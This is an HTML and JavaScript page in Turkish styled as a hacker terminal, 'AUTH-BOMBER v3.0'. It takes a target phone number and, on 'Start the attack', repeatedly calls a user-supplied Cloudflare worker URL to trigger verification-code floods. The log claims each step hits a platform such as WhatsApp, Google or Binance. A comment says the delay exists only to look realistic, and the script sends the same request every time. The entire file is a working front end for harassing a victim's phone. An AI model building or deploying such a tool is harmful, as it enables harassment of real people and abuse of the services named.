<!DOCTYPE html>
<html>
<head>
    <title>TERMINAL | AUTH-FLOODER</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
        .panel { border: 2px solid #0f0; display: inline-block; padding: 30px; box-shadow: 0 0 15px #0f0; background: #050505; border-radius: 10px; }
        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 250px; font-size: 16px; margin-bottom: 20px; outline: none; }
        button { background: #0f0; color: #000; border: none; padding: 12px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
        #log { margin-top: 20px; height: 150px; overflow-y: auto; text-align: left; font-size: 12px; border-top: 1px solid #333; padding-top: 10px; }
        .red { color: #f00; }
    </style>
</head>
<body>
    <div class="panel">
        <h1 style="margin-top:0;">[ AUTH-BOMBER v3.0 ]</h1>
        <p>HEDEF TELEFON NUMARASINI GİRİN</p>
        <input type="text" id="tel" placeholder="+905XXXXXXXXX">
        <br>
        <button onclick="atesle()">Saldırıyı Başlat</button>
        <div id="log">>> Sistem Beklemede...</div>
    </div>

    <script>
        async function atesle() {
            const no = document.getElementById('tel').value;
            const log = document.getElementById('log');
            if(no.length < 10) { alert("Numara Eksik!"); return; }

            log.innerHTML = `<p class="red">>> SALDIRI BAŞLATILDI: ${no}</p>`;
            
            // BURAYA KENDI WORKER URL'NI YAPIŞTIR
            const worker_url = "https://SENIN_WORKER_URLN.workers.dev?numara=" + no;

            const platformlar = ["WhatsApp", "Google", "Facebook", "Telegram", "Instagram", "Getir", "Trendyol", "Binance", "Netflix", "Papara"];
            
            for(let p of platformlar) {
                log.innerHTML += `<p>>> ${p} vektörü tetiklendi...</p>`;
                log.scrollTop = log.scrollHeight;
                fetch(worker_url).catch(() => {}); // API'yi tetikle
                await new Promise(r => setTimeout(r, 500)); // 0.5 saniye bekle (Gerçekçi görünmesi için)
            }
            log.innerHTML += `<p style="color:white;">>> İŞLEM TAMAMLANDI. Tüm paketler gönderildi.</p>`;
        }
    </script>
</body>
</html>
